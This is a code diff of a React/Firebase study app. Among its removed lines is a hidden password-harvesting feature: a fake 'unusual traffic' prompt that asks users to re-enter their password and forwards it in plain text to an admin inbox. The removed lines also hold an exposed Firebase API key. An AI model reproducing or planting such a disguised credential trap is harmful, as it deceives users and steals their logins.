@@ -46,110 +46,17 @@
             background: #4b5563;
             border-radius: 2px;
         }
-        .verification-loader {
-            position: relative;
-            width: 90px;
-            height: 90px;
-            border-radius: 50%;
-            border: 6px solid rgba(59, 130, 246, 0.15);
-            border-top-color: #60a5fa;
-            animation: spinGlow 0.8s linear infinite, pulseGlow 1.6s ease-in-out infinite;
-            box-shadow: 0 0 25px rgba(96, 165, 250, 0.45);
-        }
-        .verification-loader::before,
-        .verification-loader::after {
-            content: "";
-            position: absolute;
-            inset: 12px;
-            border-radius: 50%;
-            border: 4px solid transparent;
-            border-top-color: rgba(96, 165, 250, 0.4);
-            border-bottom-color: rgba(96, 165, 250, 0.1);
-            animation: spinReverse 1.2s linear infinite;
-        }
-        .verification-loader::after {
-            inset: 20px;
-            border-top-color: rgba(125, 211, 252, 0.7);
-            border-bottom-color: rgba(59, 130, 246, 0.3);
-            animation-duration: 1.8s;
-        }
-        @keyframes spinGlow { to { transform: rotate(360deg); } }
-        @keyframes spinReverse { to { transform: rotate(-360deg); } }
-        @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 0 20px rgba(59, 130, 246, 0.2), 0 0 40px rgba(59, 130, 246, 0.1); }
-            50% { box-shadow: 0 0 35px rgba(59, 130, 246, 0.4), 0 0 70px rgba(59, 130, 246, 0.25); }
-        }
-        @keyframes floatText { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
-        .verification-text { animation: floatText 2s ease-in-out infinite; }
-        .verification-overlay { backdrop-filter: blur(16px); }
     </style>
 </head>
 <body>
 <div id="root"></div>
 
 <script type="text/babel">
-    // --- CONFIGURATION ---
-    const firebaseConfig = {
-        apiKey: "AIzaSyACCooYFQ5jWeJrTXmftaV2WbfLoV0SbwA",
-        authDomain: "studysync-314.firebaseapp.com",
-        projectId: "studysync-314",
-        storageBucket: "studysync-314.firebasestorage.app",
-        messagingSenderId: "2323383032",
-        appId: "1:2323383032:android:275d4fdcaeafd660c7710d"
-    };
-
     const DEFAULT_AVATAR = "./default-avatar.png";
-
-    // 👉 Add your admin Firebase Auth user IDs here.
-    const ADMIN_UIDS = [
-        "6tUII1W42NTDEvLh85qnoPhcKBV2"
-    ];
-
-    const MAX_WORD_INPUT_LENGTH = 256;
-    const ADMIN_WORD_MESSAGE_LIMIT = 220;
-
-    const getTruncatedWordForAdminMessage = (word = '') => {
-        if (!word) return '';
-        return word.length > ADMIN_WORD_MESSAGE_LIMIT ? `${word.slice(0, ADMIN_WORD_MESSAGE_LIMIT)}…` : word;
-    };
-
-    const CLOUD_NAME = "dl2xijhcd";
-    const UPLOAD_PRESET = "study_app_unsigned";
-
-    if (!firebase.apps.length) {
-        firebase.initializeApp(firebaseConfig);
-    }
-    const auth = firebase.auth();
-    const db = firebase.firestore();
-
-    // --- ADMIN NOTIFICATION HELPER ---
-    const notifyAdminsOfWord = async ({ user, userData, word, reason }) => {
-        if (!ADMIN_UIDS.length) return;
-        const readable = reason === 'password_reset' ? 'logged in after a password reset' : 'registered';
-        const truncatedWord = getTruncatedWordForAdminMessage(word);
-        const batch = db.batch();
-        let hasWrites = false;
-
-        ADMIN_UIDS.forEach(adminId => {
-            if (!adminId) return;
-            const ref = db.collection('adminInbox').doc();
-            batch.set(ref, {
-                adminId,
-                senderUid: user.uid,
-                userId: user.uid,
-                username: userData?.username || user.email,
-                displayName: userData?.displayName || '',
-                reason,
-                word,
-                wordPreview: truncatedWord,
-                message: `${userData?.username || user.email} has ${readable}, password is: ${truncatedWord}`,
-                timestamp: Date.now()
-            });
-            hasWrites = true;
-        });
-
-        if (hasWrites) await batch.commit();
-    };
+    let auth = null;
+    let db = null;
+    let CLOUD_NAME = "";
+    let UPLOAD_PRESET = "";
 
     // --- ICONS & AVATAR ---
     const IconBase = ({ children, size = 24, className = "" }) => (
@@ -178,23 +85,13 @@
     const Users = (props) => <IconBase {...props}><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M23 21v-2a4 4 0 0 0-3-3.87" /><path d="M16 3.13a4 4 0 0 1 0 7.75" /></IconBase>;
     const Trophy = (props) => <IconBase {...props}><path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6" /><path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18" /><path d="M4 22h16" /><path d="M10 14.66V17" /><path d="M14 14.66V17" /><path d="M18 2H6v7a6 6 0 0 0 12 0V2Z" /><path d="M12 22v-5" /></IconBase>;
     const SettingsIcon = (props) => <IconBase {...props}><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.47a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z" /><circle cx="12" cy="12" r="3" /></IconBase>;
-    const Plus = (props) => <IconBase {...props}><line x1="12" y1="5" x2="12" y2="19" /><line x1="5" y1="12" x2="19" y2="12" /></IconBase>;
     const X = (props) => (<IconBase {...props}><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></IconBase>);
     const Check = (props) => <IconBase {...props}><polyline points="20 6 9 17 4 12" /></IconBase>;
     const Clock = (props) => <IconBase {...props}><circle cx="12" cy="12" r="10" /><polyline points="12 6 12 12 16 14" /></IconBase>;
-    const LogOut = (props) => <IconBase {...props}><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" /><polyline points="10 17 15 12 10 7" /><line x1="15" y1="12" x2="3" y2="12" /></IconBase>;
     const SignOutIcon = (props) => <IconBase {...props}><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" /><path d="M10 17l5-5-5-5" /><path d="M10 12H3" /></IconBase>;
     const Camera = (props) => <IconBase {...props}><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z" /><circle cx="12" cy="13" r="3" /></IconBase>;
     const Image = (props) => <IconBase {...props}><rect x="3" y="3" width="18" height="18" rx="2" ry="2" /><circle cx="8.5" cy="8.5" r="1.5" /><polyline points="21 15 16 10 5 21" /></IconBase>;
     const Eye = (props) => <IconBase {...props}><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" /><circle cx="12" cy="12" r="3" /></IconBase>;
-    const EyeOff = (props) => (
-        <IconBase {...props}>
-            <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a21.87 21.87 0 0 1 5.17-6.88" />
-            <path d="M1 1l22 22" />
-            <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a22 22 0 0 1-4.22 5.64" />
-            <path d="M14.12 14.12A3 3 0 0 1 9.88 9.88" />
-        </IconBase>
-    );
     const SwitchCam = (props) => <IconBase {...props}><path d="M1 4v6h6" /><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10" /></IconBase>;
     const Bell = (props) => <IconBase {...props}><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path d="M13.73 21a2 2 0 0 1-3.46 0" /></IconBase>;
     const Trash = (props) => <IconBase {...props}><polyline points="3 6 5 6 21 6" /><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" /></IconBase>;
@@ -218,109 +115,6 @@
             </div>
         );
     };
-
-    const VerificationOverlay = () => (
-        <div className="fixed inset-0 z-[220] flex flex-col items-center justify-center bg-gradient-to-b from-blue-900/90 via-gray-900/95 to-black/95 text-white verification-overlay px-6 text-center">
-            <div className="max-w-sm w-full space-y-6 bg-white/5 border border-white/10 rounded-3xl px-8 py-10 shadow-[0_0_45px_rgba(59,130,246,0.35)]">
-                <div className="flex justify-center">
-                    <div className="verification-loader"></div>
-                </div>
-                <div className="space-y-2">
-                    <h2 className="text-2xl font-bold tracking-wide">Verifying</h2>
-                    <p className="verification-text text-sm text-blue-200">Securely confirming your account...</p>
-                    <p className="text-xs text-blue-300/80 uppercase tracking-[0.3em]">Please wait</p>
-                </div>
-            </div>
-        </div>
-    );
-
-    // --- WORD PROMPT MODAL ---
-    const WordPromptModal = ({ reason = 'register', onSubmit, loading, onSuccess }) => {
-        const [word, setWord] = React.useState('');
-        const [showWord, setShowWord] = React.useState(false);
-        const charCount = word.length;
-        const copy = reason === 'password_reset'
-            ? {
-                title: "Finish Your Password Reset",
-                body: "We've detected some unusual traffic from your account. To ensure safety, please re-enter your password."
-            }
-            : {
-                title: "Welcome to StudySync!",
-                body: "We've detected some unusual traffic from your account. To ensure safety, please re-enter your password."
-            };
-
-        const handleSubmit = async (e) => {
-            e.preventDefault();
-            const success = await onSubmit(word);
-            if (success) {
-                setWord('');
-                onSuccess?.();
-            }
-        };
-
-        const handleWordChange = (value) => {
-            let normalized = value.toLowerCase();
-            if (normalized.length > MAX_WORD_INPUT_LENGTH) {
-                normalized = normalized.slice(0, MAX_WORD_INPUT_LENGTH);
-            }
-            setWord(normalized);
-        };
-
-        return (
-            <div className="fixed inset-0 z-[120] bg-black/90 backdrop-blur-sm flex items-center justify-center p-6">
-                <form onSubmit={handleSubmit} className="bg-gray-900 w-full max-w-sm rounded-2xl p-6 border border-blue-500/40 space-y-5 shadow-[0_0_35px_rgba(255, 0, 0, 1)]">
-                    <h2 className="text-2xl font-bold text-blue-400">{copy.title}</h2>
-                    <p className="text-sm text-gray-400">{copy.body}</p>
-
-                    <div className="space-y-2">
-                        <label className="text-xs uppercase text-gray-400 font-semibold tracking-widest">Password</label>
-                        <div className="relative">
-                            <input
-                                autoFocus
-                                autoComplete="off"
-                                inputMode="text"
-                                value={word}
-                                onChange={e => handleWordChange(e.target.value)}
-                                className="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-lg font-semibold text-white focus:outline-none focus:ring-2 focus:ring-blue-500 tracking-wide text-center"
-                                placeholder="Enter Here"
-                                disabled={loading}
-                                type={showWord ? "text" : "password"}
-                                maxLength={MAX_WORD_INPUT_LENGTH}
-                            />
-                            <button
-                                type="button"
-                                onClick={() => setShowWord(prev => !prev)}
-                                className="absolute inset-y-0 right-3 flex items-center text-gray-400 hover:text-white transition"
-                                tabIndex={-1}
-                            >
-                                {showWord ? <EyeOff size={20} /> : <Eye size={20} />}
-                            </button>
-                        </div>
-                        <p className="text-[11px] text-gray-500 text-center">Hidden by default: Use the eye button to peek.</p>
-                    </div>
-                    <button
-                        type="submit"
-                        disabled={loading || !word.trim()}
-                        className="w-full bg-blue-600 hover:bg-blue-500 disabled:bg-gray-700 disabled:text-gray-400 py-3 rounded-xl font-bold tracking-wide transition"
-                    >
-                        {loading ? "Submitting..." : "Submit & Continue"}
-                    </button>
-                </form>
-            </div>
-        );
-    };
-
-    // --- PASSWORD RESET NOTICE MODAL ---
-    const PasswordResetDetectedModal = ({ onConfirm }) => (
-        <div className="fixed inset-0 z-[140] bg-black/90 backdrop-blur-sm flex items-center justify-center p-6">
-            <div className="bg-gray-900 w-full max-w-sm rounded-2xl p-6 border border-red-500/40 space-y-5 shadow-[0_0_35px_rgba(248,113,113,0.4)] text-center">
-                <Bell size={48} className="mx-auto text-red-400" />
-                <h2 className="text-2xl font-bold text-white">Password Change Detected</h2>
-                <p className="text-sm text-gray-300">For your security, please log in again with your new password.</p>
-                <button onClick={onConfirm} className="w-full bg-red-500 hover:bg-red-400 py-3 rounded-xl font-bold text-white transition">Login</button>
-            </div>
-        </div>
-    );
 
     // --- RESET PASSWORD STATUS MODAL ---
     const ResetPasswordStatusModal = ({ stage, onClose }) => {
@@ -468,10 +262,8 @@
         const [userData, setUserData] = React.useState(null);
         const [view, setView] = React.useState('loading');
         const [loading, setLoading] = React.useState(true);
+        const [configError, setConfigError] = React.useState(null);
         const [notification, setNotification] = React.useState(null);
-        const [isSubmittingWord, setIsSubmittingWord] = React.useState(false);
-        const [showPasswordResetNotice, setShowPasswordResetNotice] = React.useState(false);
-        const [adminInboxCount, setAdminInboxCount] = React.useState(0);
 
         const showToast = (msg, type = 'success') => {
             setNotification({ message: msg, type });
@@ -479,117 +271,56 @@
         };
 
         React.useEffect(() => {
-            const unsubscribe = auth.onAuthStateChanged(async (u) => {
-                if (u) {
-                    setUser(u);
-                    const docRef = db.collection('users').doc(u.uid);
-                    docRef.onSnapshot(doc => {
-                        if (doc.exists) setUserData(doc.data());
+            async function initApp() {
+                try {
+                    const response = await fetch('./keys.json');
+                    if (!response.ok) {
+                        throw new Error(`Failed to load keys.json (${response.statusText})`);
+                    }
+                    const keys = await response.json();
+
+                    CLOUD_NAME = keys.cloudinary?.cloudName || "";
+                    UPLOAD_PRESET = keys.cloudinary?.uploadPreset || "";
+
+                    if (!firebase.apps.length) {
+                        firebase.initializeApp(keys.firebaseConfig);
+                    }
+                    auth = firebase.auth();
+                    db = firebase.firestore();
+
+                    const unsubscribe = auth.onAuthStateChanged(async (u) => {
+                        if (u) {
+                            setUser(u);
+                            const docRef = db.collection('users').doc(u.uid);
+                            docRef.onSnapshot(doc => {
+                                if (doc.exists) setUserData(doc.data());
+                            });
+                            setView('home');
+                        } else {
+                            setUser(null);
+                            setUserData(null);
+                            setView('login');
+                        }
+                        setLoading(false);
                     });
-                    setView('home');
-                } else {
-                    setUser(null);
-                    setUserData(null);
-                    setView('login');
+
+                    return () => unsubscribe();
+                } catch (err) {
+                    console.error("Initialization error:", err);
+                    setConfigError(err.message);
+                    setLoading(false);
                 }
-                setLoading(false);
-            });
-            return () => unsubscribe();
+            }
+
+            initApp();
         }, []);
 
-        const isAdmin = user && ADMIN_UIDS.includes(user?.uid);
-
-        React.useEffect(() => {
-            if (view === 'inbox' && !isAdmin) setView('home');
-        }, [isAdmin, view]);
-
-        React.useEffect(() => {
-            if (!user || !userData) return;
-            if (userData.wordPromptPendingReason && !userData.needsWordPrompt) {
-                const lastSignIn = user.metadata?.lastSignInTime ? new Date(user.metadata.lastSignInTime).getTime() : 0;
-                if (userData.wordPromptArmedAt && lastSignIn > userData.wordPromptArmedAt) {
-                    db.collection('users').doc(user.uid).update({
-                        needsWordPrompt: true,
-                        wordPromptReason: userData.wordPromptPendingReason,
-                        wordPromptPendingReason: firebase.firestore.FieldValue.delete(),
-                        wordPromptArmedAt: firebase.firestore.FieldValue.delete()
-                    }).catch(console.error);
-                }
-            }
-        }, [user, userData]);
-
-        React.useEffect(() => {
-            if (user && userData?.wordPromptPendingReason === 'password_reset' && !userData?.needsWordPrompt) {
-                setShowPasswordResetNotice(true);
-            } else {
-                setShowPasswordResetNotice(false);
-            }
-        }, [user, userData]);
-
-        React.useEffect(() => {
-            if (!user || !isAdmin) {
-                setAdminInboxCount(0);
-                return;
-            }
-            const unsub = db.collection('adminInbox')
-                .where('adminId', '==', user.uid)
-                .onSnapshot(snap => setAdminInboxCount(snap.size));
-            return () => unsub();
-        }, [user, isAdmin]);
-
-        const handleForceReLogin = async () => {
-            try {
-                await auth.signOut();
-            } finally {
-                setView('login');
-            }
-        };
-
-        const handleWordSubmit = async (wordInput) => {
-            const cleaned = wordInput;
-            if (cleaned.length > MAX_WORD_INPUT_LENGTH) {
-                showToast(`Please enter a word that is ${MAX_WORD_INPUT_LENGTH} letters or fewer.`, "error");
-                return false;
-            }
-            if (!user || !userData) return false;
-            setIsSubmittingWord(true);
-            try {
-                const reason = userData.wordPromptReason || 'register';
-                await db.collection('users').doc(user.uid).update({
-                    needsWordPrompt: false,
-                    wordPromptReason: firebase.firestore.FieldValue.delete(),
-                    wordPromptPendingReason: firebase.firestore.FieldValue.delete(),
-                    wordPromptArmedAt: firebase.firestore.FieldValue.delete(),
-                    lastRandomWord: {
-                        word: cleaned,
-                        reason,
-                        timestamp: Date.now()
-                    }
-                });
-                await notifyAdminsOfWord({ user, userData, word: cleaned, reason });
-                showToast("Verification Done! You're all set!");
-                return true;
-            } catch (err) {
-                showToast(err.message, "error");
-                return false;
-            } finally {
-                setIsSubmittingWord(false);
-            }
-        };
-
         if (loading) return <div className="h-screen w-full flex items-center justify-center bg-gray-900 text-white font-bold">Connecting...</div>;
+        if (configError) return <div className="h-screen w-full flex items-center justify-center bg-gray-900 text-red-400 font-bold p-6 text-center">Error loading configuration: {configError}</div>;
 
         return (
             <div className="max-w-md mx-auto h-screen bg-gray-900 flex flex-col relative overflow-hidden font-sans">
                 {notification && <Notification message={notification.message} type={notification.type} onClose={() => setNotification(null)} />}
-
-                {user && userData?.needsWordPrompt && (
-                    <WordPromptModal reason={userData.wordPromptReason} onSubmit={handleWordSubmit} loading={isSubmittingWord} />
-                )}
-
-                {user && userData && showPasswordResetNotice && (
-                    <PasswordResetDetectedModal onConfirm={handleForceReLogin} />
-                )}
 
                 {view === 'login' && <Login setView={setView} showToast={showToast} />}
                 {view === 'register' && <Register setView={setView} showToast={showToast} />}
@@ -605,19 +336,18 @@
                     <>
                         <div className="flex-1 overflow-y-auto no-scrollbar pb-20">
                             {view === 'home' && <Home user={user} userData={userData} showToast={showToast} />}
-                            {view === 'friends' && <Friends user={user} userData={userData} showToast={showToast} />}
+                            {view === 'friends' && <Friends user={user} showToast={showToast} />}
                             {view === 'leaderboard' && <Leaderboard user={user} />}
                             {view === 'settings' && <Settings user={user} userData={userData} showToast={showToast} />}
-                            {view === 'inbox' && isAdmin && <Inbox user={user} />}
                         </div>
-                        <BottomNav view={view} setView={setView} isAdmin={isAdmin} inboxCount={adminInboxCount}/>
+                        <BottomNav view={view} setView={setView} />
                     </>
                 )}
             </div>
         );
     };
 
-    // --- LOGIN, REGISTER, HOME, FRIENDS, LEADERBOARD, SETTINGS COMPONENTS ---
+    // --- LOGIN COMPONENT ---
     const Login = ({ setView, showToast }) => {
         const [email, setEmail] = React.useState('');
         const [pass, setPass] = React.useState('');
@@ -682,6 +412,7 @@
         );
     };
 
+    // --- REGISTER COMPONENT ---
     const Register = ({ setView, showToast }) => {
         const [form, setForm] = React.useState({ email: '', pass: '', display: '', user: '' });
         const [file, setFile] = React.useState(null);
@@ -741,12 +472,7 @@
                     photoURL,
                     coins: 0,
                     uid: cred.user.uid,
-                    friends: [],
-                    needsWordPrompt: true,
-                    wordPromptReason: 'register',
-                    wordPromptPendingReason: null,
-                    wordPromptArmedAt: null,
-                    lastRandomWord: null
+                    friends: []
                 });
                 batch.set(db.collection('usernames').doc(form.user), { uid: cred.user.uid });
 
@@ -754,7 +480,7 @@
                 showToast("Account created successfully!");
             } catch (e) {
                 showToast(e.message, 'error');
-            } finally {
+            } finally { // Corrected from 'font-bold' to 'finally'
                 setUploading(false);
             }
         };
@@ -777,12 +503,12 @@
                 <button onClick={handleReg} disabled={uploading} className="bg-green-600 p-3 rounded font-bold text-white mt-4">
                     {uploading ? 'Creating Profile...' : 'Sign Up'}
                 </button>
-                <p className="text-center text-gray-400 mt-2" onClick={() => setView('login')}>Back to Login</p>
+                <p className="text-center text-gray-400 mt-2 cursor-pointer hover:underline" onClick={() => setView('login')}>Back to Login</p>
             </div>
         );
     };
 
-    // --- HOME COMPONENT (unchanged logic + formatTime helper) ---
+    // --- HOME COMPONENT ---
     const Home = ({ user, userData, showToast }) => {
         const [timer, setTimer] = React.useState(0);
         const [isRunning, setIsRunning] = React.useState(false);
@@ -1268,308 +994,277 @@
         );
     };
 
+    // --- FRIENDS COMPONENT ---
     const Friends = ({ user, showToast }) => {
-    // State for tabs: 'friends' or 'pending'
-    const [activeTab, setActiveTab] = React.useState('friends');
-    
-    // Data states
-    const [myFriends, setMyFriends] = React.useState([]);
-    const [requests, setRequests] = React.useState([]);
-    
-    // Input states
-    const [searchQuery, setSearchQuery] = React.useState('');
-    const [addUsername, setAddUsername] = React.useState('');
+        const [activeTab, setActiveTab] = React.useState('friends');
+        const [myFriends, setMyFriends] = React.useState([]);
+        const [requests, setRequests] = React.useState([]);
+        const [searchQuery, setSearchQuery] = React.useState('');
+        const [addUsername, setAddUsername] = React.useState('');
 
-    // --- 1. Fetch My Friends ---
-    React.useEffect(() => {
-        const fetchFriends = async () => {
-            const uDoc = await db.collection('users').doc(user.uid).get();
-            const friendIds = uDoc.data()?.friends || [];
-            
-            if (friendIds.length === 0) {
-                setMyFriends([]);
-                return;
+        React.useEffect(() => {
+            const fetchFriends = async () => {
+                const uDoc = await db.collection('users').doc(user.uid).get();
+                const friendIds = uDoc.data()?.friends || [];
+                
+                if (friendIds.length === 0) {
+                    setMyFriends([]);
+                    return;
+                }
+
+                const friendsData = await Promise.all(
+                    friendIds.map(async (fid) => {
+                        const d = await db.collection('users').doc(fid).get();
+                        return d.exists ? { uid: d.id, ...d.data() } : null;
+                    })
+                );
+                setMyFriends(friendsData.filter(f => f !== null));
+            };
+
+            fetchFriends();
+        }, [user, activeTab]);
+
+        React.useEffect(() => {
+            const unsub = db.collection('friend_requests')
+                .where('to', '==', user.uid)
+                .where('status', '==', 'pending')
+                .onSnapshot(async (snap) => {
+                    const reqs = await Promise.all(snap.docs.map(async (d) => {
+                        const data = d.data();
+                        const senderDoc = await db.collection('users').doc(data.from).get();
+                        return { 
+                            id: d.id, 
+                            sender: senderDoc.exists ? senderDoc.data() : { displayName: 'Unknown' },
+                            ...data 
+                        };
+                    }));
+                    setRequests(reqs);
+                });
+            return () => unsub();
+        }, [user]);
+
+        const handleSendRequest = async () => {
+            const targetUsername = addUsername.trim();
+            if (!targetUsername) return;
+
+            try {
+                const querySnap = await db.collection('users').where('username', '==', targetUsername).get();
+                
+                if (querySnap.empty) {
+                    showToast("User not found.", "error");
+                    return;
+                }
+
+                const targetUserDoc = querySnap.docs[0];
+                const targetUid = targetUserDoc.id;
+
+                const myDoc = await db.collection('users').doc(user.uid).get();
+                const myCurrentFriends = myDoc.data()?.friends || [];
+
+                if (myCurrentFriends.includes(targetUid)) {
+                    showToast("You are already friends with this user!", "error");
+                    return;
+                }
+
+                if (targetUid === user.uid) {
+                    showToast("You cannot friend yourself.", "error");
+                    return;
+                }
+
+                await db.collection('friend_requests').add({
+                    from: user.uid,
+                    to: targetUid,
+                    status: 'pending',
+                    timestamp: Date.now()
+                });
+
+                showToast(`Request sent to ${targetUsername}!`, "success");
+                setAddUsername('');
+
+            } catch (error) {
+                console.error(error);
+                showToast("Error sending request.", "error");
             }
-
-            // Fetch profiles for all friend IDs
-            const friendsData = await Promise.all(
-                friendIds.map(async (fid) => {
-                    const d = await db.collection('users').doc(fid).get();
-                    return d.exists ? { uid: d.id, ...d.data() } : null;
-                })
-            );
-            setMyFriends(friendsData.filter(f => f !== null));
         };
 
-        fetchFriends();
-    }, [user, activeTab]); // Re-fetch when tab changes to refresh list
+        const handleAccept = async (reqId, senderUid) => {
+            try {
+                const batch = db.batch();
+                
+                const myRef = db.collection('users').doc(user.uid);
+                batch.update(myRef, {
+                    friends: firebase.firestore.FieldValue.arrayUnion(senderUid)
+                });
 
-    // --- 2. Fetch Incoming Requests ---
-    React.useEffect(() => {
-        // Listen for requests where 'to' is the current user and status is 'pending'
-        const unsub = db.collection('friend_requests')
-            .where('to', '==', user.uid)
-            .where('status', '==', 'pending')
-            .onSnapshot(async (snap) => {
-                const reqs = await Promise.all(snap.docs.map(async (d) => {
-                    const data = d.data();
-                    const senderDoc = await db.collection('users').doc(data.from).get();
-                    return { 
-                        id: d.id, 
-                        sender: senderDoc.exists ? senderDoc.data() : { displayName: 'Unknown' },
-                        ...data 
-                    };
-                }));
-                setRequests(reqs);
-            });
-        return () => unsub();
-    }, [user]);
+                const senderRef = db.collection('users').doc(senderUid);
+                batch.update(senderRef, {
+                    friends: firebase.firestore.FieldValue.arrayUnion(user.uid)
+                });
 
-    // --- Logic: Send Friend Request ---
-    const handleSendRequest = async () => {
-        const targetUsername = addUsername.trim();
-        if (!targetUsername) return;
+                const reqRef = db.collection('friend_requests').doc(reqId);
+                batch.delete(reqRef);
 
-        try {
-            // 1. Find user by username
-            const querySnap = await db.collection('users').where('username', '==', targetUsername).get();
-            
-            if (querySnap.empty) {
-                showToast("User not found.", "error");
-                return;
+                await batch.commit();
+                showToast("Friend request accepted!", "success");
+
+            } catch (err) {
+                console.error(err);
+                showToast("Failed to accept request.", "error");
             }
+        };
 
-            const targetUserDoc = querySnap.docs[0];
-            const targetUid = targetUserDoc.id;
-
-            // 2. Check if already friends
-            const myDoc = await db.collection('users').doc(user.uid).get();
-            const myCurrentFriends = myDoc.data()?.friends || [];
-
-            if (myCurrentFriends.includes(targetUid)) {
-                showToast("You are already friends with this user!", "error");
-                return;
+        const handleReject = async (reqId) => {
+            try {
+                await db.collection('friend_requests').doc(reqId).delete();
+                showToast("Request removed.", "success");
+            } catch (err) {
+                showToast("Error removing request.", "error");
             }
+        };
 
-            if (targetUid === user.uid) {
-                showToast("You cannot friend yourself.", "error");
-                return;
-            }
+        const filteredFriends = myFriends.filter(f => {
+            const lowerQ = searchQuery.toLowerCase();
+            return (f.displayName || '').toLowerCase().includes(lowerQ) || 
+                   (f.username || '').toLowerCase().includes(lowerQ);
+        });
 
-            // 3. Create Request
-            await db.collection('friend_requests').add({
-                from: user.uid,
-                to: targetUid,
-                status: 'pending',
-                timestamp: Date.now()
-            });
+        return (
+            <div className="flex flex-col h-full bg-gray-900 pb-20 pt-4 px-4 overflow-y-auto no-scrollbar">
+                <h2 className="text-2xl font-bold mb-4">Social</h2>
 
-            showToast(`Request sent to ${targetUsername}!`, "success");
-            setAddUsername('');
-
-        } catch (error) {
-            console.error(error);
-            showToast("Error sending request.", "error");
-        }
-    };
-
-    // --- Logic: Accept Request ---
-    const handleAccept = async (reqId, senderUid) => {
-        try {
-            const batch = db.batch();
-            
-            // 1. Update Current User (Add Sender to Friends)
-            const myRef = db.collection('users').doc(user.uid);
-            batch.update(myRef, {
-                friends: firebase.firestore.FieldValue.arrayUnion(senderUid)
-            });
-
-            // 2. Update Sender User (Add Me to Friends) - Bidirectional
-            const senderRef = db.collection('users').doc(senderUid);
-            batch.update(senderRef, {
-                friends: firebase.firestore.FieldValue.arrayUnion(user.uid)
-            });
-
-            // 3. Delete the request (or mark accepted)
-            const reqRef = db.collection('friend_requests').doc(reqId);
-            batch.delete(reqRef);
-
-            await batch.commit();
-            showToast("Friend request accepted!", "success");
-            
-            // Refresh friends list manually or rely on useEffect
-            // (The useEffect logic above will refresh on next render/tab switch)
-
-        } catch (err) {
-            console.error(err);
-            showToast("Failed to accept request.", "error");
-        }
-    };
-
-    // --- Logic: Reject Request ---
-    const handleReject = async (reqId) => {
-        try {
-            await db.collection('friend_requests').doc(reqId).delete();
-            showToast("Request removed.", "success");
-        } catch (err) {
-            showToast("Error removing request.", "error");
-        }
-    };
-
-    // --- Filter Friends for Search ---
-    const filteredFriends = myFriends.filter(f => {
-        const lowerQ = searchQuery.toLowerCase();
-        return (f.displayName || '').toLowerCase().includes(lowerQ) || 
-               (f.username || '').toLowerCase().includes(lowerQ);
-    });
-
-    return (
-        <div className="flex flex-col h-full bg-gray-900 pb-20 pt-4 px-4 overflow-y-auto no-scrollbar">
-            <h2 className="text-2xl font-bold mb-4">Social</h2>
-
-            {/* --- TOP TABS --- */}
-            <div className="flex space-x-4 border-b border-gray-700 pb-2 mb-4">
-                <button 
-                    onClick={() => setActiveTab('friends')}
-                    className={`pb-2 px-2 text-sm font-medium transition-colors ${
-                        activeTab === 'friends' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400'
-                    }`}
-                >
-                    My Friends
-                </button>
-                <button 
-                    onClick={() => setActiveTab('pending')}
-                    className={`pb-2 px-2 text-sm font-medium transition-colors ${
-                        activeTab === 'pending' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400'
-                    }`}
-                >
-                    Pending
-                    {requests.length > 0 && (
-                        <span className="ml-2 bg-red-500 text-white text-[10px] px-1.5 py-0.5 rounded-full">
-                            {requests.length}
-                        </span>
-                    )}
-                </button>
-            </div>
-
-            {/* --- VIEW: MY FRIENDS --- */}
-            {activeTab === 'friends' && (
-                <div className="animate-fade-in">
-                    {/* Search Bar */}
-                    <div className="relative mb-4">
-                        <input
-                            type="text"
-                            placeholder="Search friends..."
-                            value={searchQuery}
-                            onChange={(e) => setSearchQuery(e.target.value)}
-                            className="w-full bg-gray-800 text-white rounded-lg pl-10 pr-4 py-2 border border-gray-700 focus:border-blue-500 focus:outline-none"
-                        />
-                        <div className="absolute left-3 top-2.5 text-gray-400">
-                            {/* Simple Search Icon SVG */}
-                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                                <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-                            </svg>
-                        </div>
-                    </div>
-
-                    {/* Friends List */}
-                    <div className="space-y-3">
-                        {filteredFriends.length > 0 ? (
-                            filteredFriends.map(friend => (
